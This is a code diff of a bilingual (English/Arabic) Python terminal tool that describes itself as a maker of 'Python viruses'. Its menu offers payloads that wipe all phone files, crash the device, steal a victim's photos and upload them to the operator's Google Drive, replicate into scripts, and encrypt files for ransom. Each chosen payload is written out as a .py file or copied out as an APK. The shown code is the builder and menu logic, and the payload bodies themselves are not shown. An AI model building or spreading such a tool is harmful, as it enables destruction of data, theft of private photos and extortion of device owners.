-				sys.stdout.flush()
-		print(wahr)
-		def bye():
-			import os
-			os.system('clear')
-			import pyfiglet
-			from termcolor import colored
-			colored_asci = colored(asci_name, "white", "on_red", attrs=["bold"])
-			text = pyfiglet.figlet_format("     BYE", font="big")				
-			print(colored_asci)
-			print(text)
-		print(R+'《0》'+W+'Exit')
-		print(R+'《1》'+W+'The first virus deletes all phone files, including photos, audios, and others')
-		print(R+'《2》'+W+'The virus cash the device and puts pressure on the device processor')
-		print(R+'《3》'+W+"This virus steals all the victim's photos and sends them to your google drive (but you need token for google drive)")
-		print(R+'《4》'+W+'This virus creates insanely hidden files in the sdcard really fast')
-		print(R+'《5》'+W+'This virus copies itself over and over again inside file scripts such as text, etc')
-		print(R+'《6》'+W+'The virus encrypts all phone files with a password that you specify, and the password is saved in the Password.txt file, and the Password.txt file is sent to your account on Google Drive')
-		print(G+'《0》'+W+ 'إلغاء')
-		print(G+'《1》'+W+'يقوم الفيروس الأول بحذف جميع ملفات الهاتف ، بما في ذلك الصور والتسجيلات الصوتية وغيرها')
-		print(G+'《2》'+W+'يقوم الفيروس بالضغط على الجهاز ويعلقه ويضغط على معالج الجهاز')
-		print(G+'《3》'+W+"يسرق هذا الفيروس جميع صور الضحايا ويرسلها إلى حسابك على google drive  (لكنك تحتاج إلى الـtoken لـ google drive الخاص بك)")
-		print(G+'《4》'+W+'يقوم هذا الفيروس بإنشاء ملفات مخفية بسرعة كبيرة ولا يمكن للضحية رؤيتها')
-		print(G+'《5》'+W+'يقوم هذا الفايروس بنسح نفسه مراراً وتكراراً بداخل سكربتات الملفات مثل النصوص او وغيرها')
-		print(G+'《6》'+W+'يقوم الفايروس بتشفير جميع ملفات الهاتف ب باسوورد انت تقوم بتحديده ويتم حفظ الباسورد بملف Password.txt ويتم إرسال ملف Password.txt لحسابك على Google Drive ')
-		Virus00=str(input("\033[31m ┌─["+LIGHTGREEN_EX+"𝘾𝙃𝙊𝙊𝙎𝙀 𝙏𝙃𝙀  "+BLUE+"~"+R+"@"+W+"𝙑𝙄𝙍𝙐𝙎 𝙔𝙊𝙐 𝙒𝘼𝙉𝙏 "+R+"""]
- └──╼ """+W+"$ "))
-		if not Virus00.isdigit() or int(Virus00) not in [1, 2, 3, 4, 5, 6, 0]:
-			    os.system('clear')
-			    print('The character you entered does not exist. Please choose from the following numbers:\n0\n1\n2\n3\n4\n5\n6')
-			    print('الحرف او الرقم الذي ادخلته غير موجود يرجى الاختيار من الارقام التالية:\n0\n1\n2\n3\n4\n5\n6')
-			    run()
-		if Virus00 == "0":
-				bye()
-				exit()
-		if Virus00 == "1":
-				BLUE = ("\033[34m")
-				GREN = ('\033[92m')
-				White = ("\033[97m")
-				RED = ("\033[31m")
-				LIGHTGREEN_EX = ('\033[92m')
-				delet_name = input("\033[31m ┌─["+LIGHTGREEN_EX+"Please Type the"+BLUE+"~"+RED+"@"+White+"The Virus name"+RED+"""]"""+White+"""°or°"""+RED+"""["""+LIGHTGREEN_EX+"Enter"+RED+"("+White+".."+RED+")"+White+"To Back"+RED+"""]
- └──╼ """+White+"$ ")
-				if delet_name == '..':
-					os.system('clear')
-					run_random_funktion()
-					op()
-				with open(delet_name+".py", "w",encoding='utf-8') as f:
-					f.write(delet_virus)
-				ascii()
-				print(White+'The virus has been saved as ' +RED+ delet_name + '.py')
-				def restart():
-				    while True:
-				        import os
-				        restart = input("\033[31m ┌─["+LIGHTGREEN_EX+"Do You Want"+BLUE+"~"+RED+"@"+White+"Back"+RED+"""]
- └──╼  """+White+"(y/n) ? ")
-				        if restart == "y":
-				            import os
-				            os.system('clear')
-				            run()
-				          #  break
-				        elif restart == "n":
-				            bye()
-				            exit()
-				        else:
-				            os.system('clear')
-				            print('The character you entered does not exist. Please choose :\ny\nor\nn')
-				            print('الحرف او الرقم الذي ادخلته غير موجود يرجى الاختيار من الحرف :\ny\nأو\nn')
-				restart()
-			########
-			##Virus2##
-			########
-		if Virus00 == "2":
-				BLUE = ("\033[34m")
-				GREN = ('\033[92m')
-				White = ("\033[97m")
-				RED = ("\033[31m")
-				LIGHTGREEN_EX = ('\033[92m')
-				crash_name = input("\033[31m ┌─["+LIGHTGREEN_EX+"Please Type the"+BLUE+"~"+RED+"@"+White+"The Virus name"+RED+"""]"""+White+"""°or°"""+RED+"""["""+LIGHTGREEN_EX+"Enter"+RED+"("+White+".."+RED+")"+White+"To Back"+RED+"""]
- └──╼ """+White+"$ ")
-				if crash_name == '..':
-					os.system('clear')
-					run_random_funktion()
-					op()
-				with open(crash_name+".py", "w",encoding='utf-8') as f:
-					f.write(crash_virus)
-				ascii()
-				print(White+'The virus has been saved as ' +RED+ crash_name + '.py')
-				def restart():
-				    while True:
-				        import os
-				        restart = input("\033[31m ┌─["+LIGHTGREEN_EX+"Do You Want"+BLUE+"~"+RED+"@"+White+"Back"+RED+"""]
- └──╼  """+White+"(y/n) ? ")
-				        if restart == "y":
-				            import os
-				            os.system('clear')
-				            run()
-				          #  break
-				        elif restart == "n":
-				            bye()
-				            exit()
-				        else:
-				            os.system('clear')
-				            print('The character you entered does not exist. Please choose :\ny\nor\nn')
-				            print('الحرف او الرقم الذي ادخلته غير موجود يرجى الاختيار من الحرف :\ny\nأو\nn')
-				restart()
-		if Virus00 == "3":
-				BLUE = ("\033[34m")
-				GREN = ('\033[92m')
-				White = ("\033[97m")
-				RED = ("\033[31m")
-				LIGHTGREEN_EX = ('\033[92m')
-				Open_name = input("\033[31m ┌─["+LIGHTGREEN_EX+"Please Type the"+BLUE+"~"+RED+"@"+White+"The Virus name"+RED+"""]"""+White+"""°or°"""+RED+"""["""+LIGHTGREEN_EX+"Enter"+RED+"("+White+".."+RED+")"+White+"To Back"+RED+"""]
- └──╼ """+White+"$ ")
-				if Open_name == '..':
-					os.system('clear')
-					run_random_funktion()
-					op()
-				import webbrowser
-				url = 'https://accounts.google.com/o/oauth2/v2/auth/oauthchooseaccount?redirect_uri=https%3A%2F%2Fdevelopers.google.com%2Foauthplayground&prompt=consent&response_type=code&client_id=407408718192.apps.googleusercontent.com&scope=https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fdrive&access_type=offline&service=lso&o2v=2&flowName=GeneralOAuthFlow'
-				webbrowser.open(url)
-				print(RED+'You Can found your Google Drive token Here👇/يمكنك العثور على رمز التوكن الخاص بحسابك على جوجل درايف هنا\n')
-				print('https://accounts.google.com/o/oauth2/v2/auth/oauthchooseaccount?redirect_uri=https%3A%2F%2Fdevelopers.google.com%2Foauthplayground&prompt=consent&response_type=code&client_id=407408718192.apps.googleusercontent.com&scope=https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fdrive&access_type=offline&service=lso&o2v=2&flowName=GeneralOAuthFlow\n')
-				nun = input("\033[31m ┌─["+LIGHTGREEN_EX+"Please Type the"+BLUE+"~"+RED+"@"+White+"Google Drive Code"+RED+"""]
- └──╼ """+White+"$ ")
-				new_text = Open_virus.replace("abcde", nun)
-				with open(Open_name+'.py', 'w',encoding='utf-8') as file:
-					file.write(new_text)
-				ascii()
-				print(White+'The virus has been saved as ' +RED+ Open_name + '.py')
-				############
-				def restart():
-				    while True:
-					    import os
-					    restart = input("\033[31m ┌─["+LIGHTGREEN_EX+"Do You Want"+BLUE+"~"+RED+"@"+White+"Back"+RED+"""]
- └──╼  """+White+"(y/n) ? ")
-					    if restart == "y":
-						    import os
-						    os.system('clear')
-						    run()
-					    elif restart == "n":
-						    bye()
-						    exit()
-					    else:
-						    os.system('clear')
-						    print('The character you entered does not exist. Please choose :\ny\nor\nn')
-						    print('الحرف او الرقم الذي ادخلته غير موجود يرجى الاختيار من الحرف :\ny\nأو\nn')
-				restart()
-		if Virus00 == "4":
-				BLUE = ("\033[34m")
-				GREN = ('\033[92m')
-				White = ("\033[97m")
-				RED = ("\033[31m")
-				LIGHTGREEN_EX = ('\033[92m')
-				config_name = input("\033[31m ┌─["+LIGHTGREEN_EX+"Please Type the"+BLUE+"~"+RED+"@"+White+"The Virus name"+RED+"""]"""+White+"""°or°"""+RED+"""["""+LIGHTGREEN_EX+"Enter"+RED+"("+White+".."+RED+")"+White+"To Back"+RED+"""]
- └──╼ """+White+"$ ")
-				if config_name == '..':
-					os.system('clear')
-					run_random_funktion()
-					op()
-				with open(config_name+".py", "w",encoding='utf-8') as f:
-					f.write(config_virus)
-				ascii()
-				print(White+'The virus has been saved as ' +RED+ config_name + '.py')
-				def restart():
-				    while True:
-				        import os
-				        restart = input("\033[31m ┌─["+LIGHTGREEN_EX+"Do You Want"+BLUE+"~"+RED+"@"+White+"Back"+RED+"""]
- └──╼  """+White+"(y/n) ? ")
-				        if restart == "y":
-				            import os
-				            os.system('clear')
-				            run()
-				          #  break
-				        elif restart == "n":
-				            bye()
-				            exit()
-				        else:
-				            os.system('clear')
-				            print('The character you entered does not exist. Please choose :\ny\nor\nn')
-				            print('الحرف او الرقم الذي ادخلته غير موجود يرجى الاختيار من الحرف :\ny\nأو\nn')
-				restart()
-		if Virus00 == "5":
-				BLUE = ("\033[34m")
-				GREN = ('\033[92m')
-				White = ("\033[97m")
-				RED = ("\033[31m")
-				LIGHTGREEN_EX = ('\033[92m')
-				spreading_name = input("\033[31m ┌─["+LIGHTGREEN_EX+"Please Type the"+BLUE+"~"+RED+"@"+White+"The Virus name"+RED+"""]"""+White+"""°or°"""+RED+"""["""+LIGHTGREEN_EX+"Enter"+RED+"("+White+".."+RED+")"+White+"To Back"+RED+"""]
- └──╼ """+White+"$ ")
-				if spreading_name == '..':
-					os.system('clear')
-					run_random_funktion()
-					op()
-				with open(spreading_name+".py", "w",encoding='utf-8') as f:
-					f.write(spreading_virus)
-				# with open(spreading_name+'.py',"w", encoding='utf-8') as file:
-				# 	file.write(inspect.getsource(funktion3))
-				# with open(spreading_name+'.py',"r") as file:
-				# 	filedata = file.read()
-				# 	filedata = filedata.replace("pass", "")
-				# 	filedata = filedata.replace("spreading_name", "")
-				# 	print("Saved as "+spreading_name+".py")
-				# with open(spreading_name+'.py',"w") as file:
-				# 	file.write(filedata)
-				# with open(spreading_name+'.py',"a") as file:
-				# 	file.write("funktion3()")
-				ascii()
-				print(White+'The virus has been saved as ' +RED+ spreading_name + '.py')
-				def restart():
-				    while True:
-				        import os
-				        restart = input("\033[31m ┌─["+LIGHTGREEN_EX+"Do You Want"+BLUE+"~"+RED+"@"+White+"Back"+RED+"""]
- └──╼  """+White+"(y/n) ? ")
-				        if restart == "y":
-				            import os
-				            os.system('clear')
-				            run()
-				          #  break
-				        elif restart == "n":
-				            bye()
-				            exit()
-				        else:
-				            os.system('clear')
-				            print('The character you entered does not exist. Please choose :\ny\nor\nn')
-				            print('الحرف او الرقم الذي ادخلته غير موجود يرجى الاختيار من الحرف :\ny\nأو\nn')
-				restart()
-		if Virus00 == "6":
-				BLUE = ("\033[34m")
-				GREN = ('\033[92m')
-				White = ("\033[97m")
-				RED = ("\033[31m")
-				LIGHTGREEN_EX = ('\033[92m')
-				encrypted_name = input("\033[31m ┌─["+LIGHTGREEN_EX+"Please Type the"+BLUE+"~"+RED+"@"+White+"The Virus name"+RED+"""]"""+White+"""°or°"""+RED+"""["""+LIGHTGREEN_EX+"Enter"+RED+"("+White+".."+RED+")"+White+"To Back"+RED+"""]
- └──╼ """+White+"$ ")
-				if encrypted_name == '..':
-					os.system('clear')
-					run_random_funktion()
-					op()
-				password = input("\033[31m ┌─["+LIGHTGREEN_EX+"Please Type the"+BLUE+"~"+RED+"@"+White+"Password Encrypted"+RED+"""]
- └──╼ """+White+"$ ")
-				import webbrowser
-				url = 'https://accounts.google.com/o/oauth2/v2/auth/oauthchooseaccount?redirect_uri=https%3A%2F%2Fdevelopers.google.com%2Foauthplayground&prompt=consent&response_type=code&client_id=407408718192.apps.googleusercontent.com&scope=https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fdrive&access_type=offline&service=lso&o2v=2&flowName=GeneralOAuthFlow'
-				webbrowser.open(url)
-				print(RED+'You Can found your Google Drive token Here👇/يمكنك العثور على رمز التوكن الخاص بحسابك على جوجل درايف هنا\n')
-				print('https://accounts.google.com/o/oauth2/v2/auth/oauthchooseaccount?redirect_uri=https%3A%2F%2Fdevelopers.google.com%2Foauthplayground&prompt=consent&response_type=code&client_id=407408718192.apps.googleusercontent.com&scope=https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fdrive&access_type=offline&service=lso&o2v=2&flowName=GeneralOAuthFlow\n')
-				nun = input("\033[31m ┌─["+LIGHTGREEN_EX+"Please Type the"+BLUE+"~"+RED+"@"+White+"Google Drive Code"+RED+"""]
- └──╼ """+White+"$ ")
-				new_text = encrypted_virus.replace("abcde", nun)
-				new_text = new_text.replace("passe", password)
-				with open(encrypted_name+'.py', 'w', encoding='utf-8') as file:
-					file.write(new_text)
+  import webbrowser, wget, requests
+  url = 'https://raw.githubusercontent.com/made-de/Virus-Py/main/2.1v'
+  response = requests.get(url)
+  version_number = url.split("/")[-1]
+  if __name__ == '__main__':
+    with open(__file__) as f:
+      content = f.read()
+    if response.status_code != 200:
+      print('    This script is outdated. Please update it to version',
+            version_number)
+      os.remove(__file__)
+      exit()
+  words = "\033[34m     𝚃𝙷𝙸𝚂 𝚃𝙾𝙾𝙻 𝙸𝚂 𝙵𝙾𝚁 𝙼𝙰𝙺𝙴 𝙿𝚈𝚃𝙷𝙾𝙽 𝚅𝙸𝚁𝚄𝚂 \n\n"
+  wahr = '\033[34m################################################################\nI am not responsible for any use of this tool or the information provided for the purpose of security and safety. It must be used wisely and responsibly according to the specified terms and conditions, without using it for any unlawful purpose or that may result in any harm or loss.\n################################################################\n\033[92m هذه الأداة لصنع فيروسات على هيئة سكربتات بايثون     \n\n################################################################\nانا لست مسؤولا عن استخدام هذه الأداة أو المعلومات المقدمة بهدف الحماية  والأمان، ويجب استخدامها بحكمة ومسؤولية وفقًا للشروط والأحكام المحددة، دون استخدامها لأي غرض غير قانوني أو يمكن أن يؤدي إلى أي أضرار أو خسائر..\n################################################################\n'
+  vers = ('\033[34m              Virus-Scripts version ' + version_number +
+          '\n')
+
+  ##################
+  def run():
+    GREN = ('\033[92m')
+    BLUE = ("\033[34m")
+    pink = ('\033[95m')
+    White = ("\033[97m")
+    RED = ("\033[31m")
+    yellow = ('\033[93m')
+    LIGHTGREEN_EX = ('\033[92m')
+    print(vers)
+    for char in words:
+      sleep(0.1)
+      sys.stdout.write(char)
+      sys.stdout.flush()
+    print(wahr)
+
+    def bye():
+      import os
+      os.system('clear')
+      import pyfiglet
+      from termcolor import colored
+      colored_asci = colored(asci_name, "white", "on_red", attrs=["bold"])
+      text = pyfiglet.figlet_format("     BYE", font="big")
+      print(colored_asci)
+      print(text)
+
+    print(R + '《0》' + W + 'Exit')
+    print(
+        R + '《1》' + W +
+        'The first virus deletes all phone files, including photos, audios, and others'
+    )
+    print(
+        R + '《2》' + W +
+        'The virus cash the device and puts pressure on the device processor')
+    print(
+        R + '《3》' + W +
+        "This virus steals all the victim's photos and sends them to your google drive (but you need token for google drive)"
+    )
+    print(R + '《4》' + W +
+          'This virus creates insanely hidden files in the sdcard really fast')
+    print(
+        R + '《5》' + W +
+        'This virus copies itself over and over again inside file scripts such as text, etc'
+    )
+    print(
+        R + '《6》' + W +
+        'The virus encrypts all phone files with a password that you specify, and the password is saved in the Password.txt file, and the Password.txt file is sent to your account on Google Drive'
+    )
+    print(G + '《0》' + W + 'إلغاء')
+    print(
+        G + '《1》' + W +
+        'يقوم الفيروس الأول بحذف جميع ملفات الهاتف ، بما في ذلك الصور والتسجيلات الصوتية وغيرها'
+    )
+    print(G + '《2》' + W +
+          'يقوم الفيروس بالضغط على الجهاز ويعلقه ويضغط على معالج الجهاز')
+    print(
+        G + '《3》' + W +
+        "يسرق هذا الفيروس جميع صور الضحايا ويرسلها إلى حسابك على google drive  (لكنك تحتاج إلى الـtoken لـ google drive الخاص بك)"
+    )
+    print(
+        G + '《4》' + W +
+        'يقوم هذا الفيروس بإنشاء ملفات مخفية بسرعة كبيرة ولا يمكن للضحية رؤيتها'
+    )
+    print(
+        G + '《5》' + W +
+        'يقوم هذا الفايروس بنسح نفسه مراراً وتكراراً بداخل سكربتات الملفات مثل النصوص او وغيرها'
+    )
+    print(
+        G + '《6》' + W +
+        'يقوم الفايروس بتشفير جميع ملفات الهاتف ب باسوورد انت تقوم بتحديده ويتم حفظ الباسورد بملف Password.txt ويتم إرسال ملف Password.txt لحسابك على Google Drive '
+    )
+    Virus00 = str(
+        input("\033[31m ┌─[" + LIGHTGREEN_EX + "𝘾𝙃𝙊𝙊𝙎𝙀 𝙏𝙃𝙀  " + BLUE + "~" +
+              R + "@" + W + "𝙑𝙄𝙍𝙐𝙎 𝙔𝙊𝙐 𝙒𝘼𝙉𝙏 " + R + """]
+ └──╼ """ + W + "$ "))
+    if not Virus00.isdigit() or int(Virus00) not in [1, 2, 3, 4, 5, 6, 0]:
+      os.system('clear')
+      print(
+          'The character you entered does not exist. Please choose from the following numbers:\n0\n1\n2\n3\n4\n5\n6'
+      )
+      print(
+          'الحرف او الرقم الذي ادخلته غير موجود يرجى الاختيار من الارقام التالية:\n0\n1\n2\n3\n4\n5\n6'
+      )
+      run()
+    if Virus00 == "0":
+      bye()
+      exit()
+    if Virus00 == "1":
+      BLUE = ("\033[34m")
+      GREN = ('\033[92m')
+      White = ("\033[97m")
+      RED = ("\033[31m")
+      print(
+        GREN + '《1》' + White +
+        'Python'
+      )
+      print(
+        RED + '《2》' + White +
+        'APK')
+      DChose = str(
+              input("\033[31m ┌─[" + LIGHTGREEN_EX + "Chosse the " + BLUE + "~" +
+                    RED + "@" + W + "Virus Type " + RED + """]
+  └──╼ """ + White + "$ "))
+      if not DChose.isdigit() or int(DChose) not in [1, 2, 0]:
+        os.system('clear')
+        print(
+            'The character you entered does not exist. Please choose from the following numbers:\n0\n1\n2'
+        )
+        print(
+            'الحرف او الرقم الذي ادخلته غير موجود يرجى الاختيار من الارقام التالية:\n0\n1\n2'
+        )
+        run()
+      if DChose == "0":
+        bye()
+        exit()
+      if DChose  == "1":        
+        LIGHTGREEN_EX = ('\033[92m')
+        delet_name = input("\033[31m ┌─[" + LIGHTGREEN_EX + "Please Type the" +
+                           BLUE + "~" + RED + "@" + White + "The Virus name" +
+                           RED + """]""" + White + """°or°""" + RED + """[""" +
+                           LIGHTGREEN_EX + "Enter" + RED + "(" + White + ".." +
+                           RED + ")" + White + "To Back" + RED + """]
+└──╼ """ + White + "$ ")
+        if delet_name == '..':
+          os.system('clear')
+          run_random_funktion()
+          op()
+        with open(delet_name + ".py", "w", encoding='utf-8') as f:
+          f.write(delet_virus)
+        ascii()
+        print(White + 'The virus has been saved as ' + RED + delet_name + '.py')
+  
+        def restart():
+          while True:
+            import os
+            restart = input("\033[31m ┌─[" + LIGHTGREEN_EX + "Do You Want" +
+                            BLUE + "~" + RED + "@" + White + "Back" + RED + """]
+└──╼  """ + White + "(y/n) ? ")
+            if restart == "y":
+              import os
+              os.system('clear')
+              run()
+            #  break
+            elif restart == "n":
+              bye()
+              exit()
+            else:
+              os.system('clear')
+              print(
+                  'The character you entered does not exist. Please choose :\ny\nor\nn'
+              )
+              print(
+                  'الحرف او الرقم الذي ادخلته غير موجود يرجى الاختيار من الحرف :\ny\nأو\nn'
+              )
+  
+        restart()
+      if DChose  == "2":
+        from shutil import copy
+        LIGHTGREEN_EX = ('\033[92m')
+        DFile = '.APK/Delet.apk'
+        delet_name = input("\033[31m ┌─[" + LIGHTGREEN_EX + "Please Type the" +
+                           BLUE + "~" + RED + "@" + White + "The Virus name" +
+                           RED + """]""" + White + """°or°""" + RED + """[""" +
+                           LIGHTGREEN_EX + "Enter" + RED + "(" + White + ".." +
+                           RED + ")" + White + "To Back" + RED + """]
+└──╼ """ + White + "$ ")
+        if delet_name == '..':
+          os.system('clear')
+          run_random_funktion()
+          op()
+        copy(DFile,delet_name+'.apk')
+        ascii()
+        print(White + 'The virus has been saved as ' + RED + delet_name + '.apk')
+  
+        def restart():
+          while True:
+            import os
+            restart = input("\033[31m ┌─[" + LIGHTGREEN_EX + "Do You Want" +
+                            BLUE + "~" + RED + "@" + White + "Back" + RED + """]
+   └──╼  """ + White + "(y/n) ? ")
+            if restart == "y":
+              import os
+              os.system('clear')
+              run()
+            #  break
+            elif restart == "n":
+              bye()
+              exit()
+            else:
+              os.system('clear')
+              print(
+                  'The character you entered does not exist. Please choose :\ny\nor\nn'
+              )
+              print(
+                  'الحرف او الرقم الذي ادخلته غير موجود يرجى الاختيار من الحرف :\ny\nأو\nn'
+              )
+  
+        restart()
+    ########
+    ##Virus2##
+    ########
+    if Virus00 == "2":
+      BLUE = ("\033[34m")
+      GREN = ('\033[92m')
+      White = ("\033[97m")
+      RED = ("\033[31m")
+      print(
+        GREN + '《1》' + White +
+        'Python'
+      )
+      print(
+        RED + '《2》' + White +
+        'APK')
+      CChose = str(
+              input("\033[31m ┌─[" + LIGHTGREEN_EX + "Chosse the " + BLUE + "~" +
+                    RED + "@" + W + "Virus Type " + RED + """]
+ └──╼ """ + White + "$ "))
+      if not CChose.isdigit() or int(CChose) not in [1, 2, 0]:
+        os.system('clear')
+        print(
+            'The character you entered does not exist. Please choose from the following numbers:\n0\n1\n2'
+        )
+        print(
+            'الحرف او الرقم الذي ادخلته غير موجود يرجى الاختيار من الارقام التالية:\n0\n1\n2'
+        )
+        run()
+      if CChose == "0":
+        bye()
+        exit()
+      if CChose  == "1":        
+        LIGHTGREEN_EX = ('\033[92m')
+        crash_name = input("\033[31m ┌─[" + LIGHTGREEN_EX + "Please Type the" +
+                           BLUE + "~" + RED + "@" + White + "The Virus name" +
+                           RED + """]""" + White + """°or°""" + RED + """[""" +
+                           LIGHTGREEN_EX + "Enter" + RED + "(" + White + ".." +
+                           RED + ")" + White + "To Back" + RED + """]
+ └──╼ """ + White + "$ ")
+        if crash_name == '..':
+          os.system('clear')
+          run_random_funktion()
+          op()
+        with open(crash_name + ".py", "w", encoding='utf-8') as f:
+          f.write(crash_virus)
+        ascii()
+        print(White + 'The virus has been saved as ' + RED + crash_name + '.py')
+  
+        def restart():
+          while True:
+            import os
+            restart = input("\033[31m ┌─[" + LIGHTGREEN_EX + "Do You Want" +
+                            BLUE + "~" + RED + "@" + White + "Back" + RED + """]
+ └──╼  """ + White + "(y/n) ? ")
+            if restart == "y":
+              import os
+              os.system('clear')
+              run()
+            #  break
+            elif restart == "n":
+              bye()
+              exit()
+            else:
+              os.system('clear')
+              print(
+                  'The character you entered does not exist. Please choose :\ny\nor\nn'
+              )
+              print(
+                  'الحرف او الرقم الذي ادخلته غير موجود يرجى الاختيار من الحرف :\ny\nأو\nn'
+              )
+  
+        restart()
+      if CChose  == "2":
+        from shutil import copy
+        LIGHTGREEN_EX = ('\033[92m')
+        CFile = '.APK/Crash.apk'
+        crash_name = input("\033[31m ┌─[" + LIGHTGREEN_EX + "Please Type the" +
+                           BLUE + "~" + RED + "@" + White + "The Virus name" +
+                           RED + """]""" + White + """°or°""" + RED + """[""" +
+                           LIGHTGREEN_EX + "Enter" + RED + "(" + White + ".." +
+                           RED + ")" + White + "To Back" + RED + """]
+ └──╼ """ + White + "$ ")
+        if crash_name == '..':
+          os.system('clear')
+          run_random_funktion()
+          op()
+        copy(CFile,crash_name+'.apk')
+        ascii()
+        print(White + 'The virus has been saved as ' + RED + crash_name + '.apk')
+  
+        def restart():
+          while True:
+            import os
+            restart = input("\033[31m ┌─[" + LIGHTGREEN_EX + "Do You Want" +
+                            BLUE + "~" + RED + "@" + White + "Back" + RED + """]
+ └──╼  """ + White + "(y/n) ? ")
+            if restart == "y":
+              import os
+              os.system('clear')
+              run()
+            #  break
+            elif restart == "n":
+              bye()
+              exit()
+            else:
+              os.system('clear')
+              print(
+                  'The character you entered does not exist. Please choose :\ny\nor\nn'
+              )
+              print(
+                  'الحرف او الرقم الذي ادخلته غير موجود يرجى الاختيار من الحرف :\ny\nأو\nn'
+              )
+  
+        restart()
+    if Virus00 == "3":
+      BLUE = ("\033[34m")
+      GREN = ('\033[92m')
+      White = ("\033[97m")
+      RED = ("\033[31m")
+      LIGHTGREEN_EX = ('\033[92m')
+      Open_name = input("\033[31m ┌─[" + LIGHTGREEN_EX + "Please Type the" +
+                        BLUE + "~" + RED + "@" + White + "The Virus name" +
+                        RED + """]""" + White + """°or°""" + RED + """[""" +
+                        LIGHTGREEN_EX + "Enter" + RED + "(" + White + ".." +
+                        RED + ")" + White + "To Back" + RED + """]
+ └──╼ """ + White + "$ ")
+      if Open_name == '..':
+        os.system('clear')
+        run_random_funktion()
+        op()
+      import webbrowser
+      url = 'https://accounts.google.com/o/oauth2/v2/auth/oauthchooseaccount?redirect_uri=https%3A%2F%2Fdevelopers.google.com%2Foauthplayground&prompt=consent&response_type=code&client_id=407408718192.apps.googleusercontent.com&scope=https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fdrive&access_type=offline&service=lso&o2v=2&flowName=GeneralOAuthFlow'
+      webbrowser.open(url)
+      print(
+          RED +
+          'You Can found your Google Drive token Here👇/يمكنك العثور على رمز التوكن الخاص بحسابك على جوجل درايف هنا\n'
+      )
+      print(
+          'https://accounts.google.com/o/oauth2/v2/auth/oauthchooseaccount?redirect_uri=https%3A%2F%2Fdevelopers.google.com%2Foauthplayground&prompt=consent&response_type=code&client_id=407408718192.apps.googleusercontent.com&scope=https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fdrive&access_type=offline&service=lso&o2v=2&flowName=GeneralOAuthFlow\n'
+      )
+      nun = input("\033[31m ┌─[" + LIGHTGREEN_EX + "Please Type the" + BLUE +
+                  "~" + RED + "@" + White + "Google Drive Code" + RED + """]
+ └──╼ """ + White + "$ ")
+      new_text = Open_virus.replace("abcde", nun)
+      with open(Open_name + '.py', 'w', encoding='utf-8') as file:
+        file.write(new_text)
+      ascii()
+      print(White + 'The virus has been saved as ' + RED + Open_name + '.py')
+
+      ############
+      def restart():
+        while True:
+          import os
+          restart = input("\033[31m ┌─[" + LIGHTGREEN_EX + "Do You Want" +
+                          BLUE + "~" + RED + "@" + White + "Back" + RED + """]
+ └──╼  """ + White + "(y/n) ? ")
+          if restart == "y":
+            import os
+            os.system('clear')
+            run()
+          elif restart == "n":
+            bye()
+            exit()
+          else:
+            os.system('clear')
+            print(
+                'The character you entered does not exist. Please choose :\ny\nor\nn'
+            )
+            print(
+                'الحرف او الرقم الذي ادخلته غير موجود يرجى الاختيار من الحرف :\ny\nأو\nn'
+            )
+
+      restart()
+    if Virus00 == "4":
+      BLUE = ("\033[34m")
+      GREN = ('\033[92m')
+      White = ("\033[97m")
+      RED = ("\033[31m")
+      LIGHTGREEN_EX = ('\033[92m')
+      config_name = input("\033[31m ┌─[" + LIGHTGREEN_EX + "Please Type the" +
+                          BLUE + "~" + RED + "@" + White + "The Virus name" +
+                          RED + """]""" + White + """°or°""" + RED + """[""" +
+                          LIGHTGREEN_EX + "Enter" + RED + "(" + White + ".." +
+                          RED + ")" + White + "To Back" + RED + """]
+ └──╼ """ + White + "$ ")
+      if config_name == '..':
+        os.system('clear')
+        run_random_funktion()
+        op()
+      with open(config_name + ".py", "w", encoding='utf-8') as f:
+        f.write(config_virus)
+      ascii()
+      print(White + 'The virus has been saved as ' + RED + config_name + '.py')
+
+      def restart():
+        while True:
+          import os
+          restart = input("\033[31m ┌─[" + LIGHTGREEN_EX + "Do You Want" +
+                          BLUE + "~" + RED + "@" + White + "Back" + RED + """]
+ └──╼  """ + White + "(y/n) ? ")
+          if restart == "y":
+            import os
+            os.system('clear')
+            run()
+          #  break
+          elif restart == "n":
+            bye()
+            exit()
+          else:
+            os.system('clear')
+            print(
+                'The character you entered does not exist. Please choose :\ny\nor\nn'
+            )
+            print(
+                'الحرف او الرقم الذي ادخلته غير موجود يرجى الاختيار من الحرف :\ny\nأو\nn'
+            )
+
+      restart()
+    if Virus00 == "5":
+      BLUE = ("\033[34m")
+      GREN = ('\033[92m')
+      White = ("\033[97m")
+      RED = ("\033[31m")
+      LIGHTGREEN_EX = ('\033[92m')
+      spreading_name = input("\033[31m ┌─[" + LIGHTGREEN_EX +
+                             "Please Type the" + BLUE + "~" + RED + "@" +
+                             White + "The Virus name" + RED + """]""" + White +
+                             """°or°""" + RED + """[""" + LIGHTGREEN_EX +
+                             "Enter" + RED + "(" + White + ".." + RED + ")" +
+                             White + "To Back" + RED + """]
+ └──╼ """ + White + "$ ")
+      if spreading_name == '..':
+        os.system('clear')
+        run_random_funktion()
+        op()
+      with open(spreading_name + ".py", "w", encoding='utf-8') as f:
+        f.write(spreading_virus)
+      # with open(spreading_name+'.py',"w", encoding='utf-8') as file:
+      # 	file.write(inspect.getsource(funktion3))
+      # with open(spreading_name+'.py',"r") as file:
+      # 	filedata = file.read()
+      # 	filedata = filedata.replace("pass", "")
+      # 	filedata = filedata.replace("spreading_name", "")
+      # 	print("Saved as "+spreading_name+".py")
+      # with open(spreading_name+'.py',"w") as file:
+      # 	file.write(filedata)
+      # with open(spreading_name+'.py',"a") as file:
+      # 	file.write("funktion3()")
+      ascii()
+      print(White + 'The virus has been saved as ' + RED + spreading_name +
+            '.py')
+
+      def restart():
+        while True:
+          import os
+          restart = input("\033[31m ┌─[" + LIGHTGREEN_EX + "Do You Want" +
+                          BLUE + "~" + RED + "@" + White + "Back" + RED + """]
+ └──╼  """ + White + "(y/n) ? ")
+          if restart == "y":
+            import os
+            os.system('clear')
+            run()
+          #  break
+          elif restart == "n":
+            bye()
+            exit()
+          else:
+            os.system('clear')
+            print(
+                'The character you entered does not exist. Please choose :\ny\nor\nn'
+            )
+            print(
+                'الحرف او الرقم الذي ادخلته غير موجود يرجى الاختيار من الحرف :\ny\nأو\nn'
+            )
+
+      restart()
+    if Virus00 == "6":
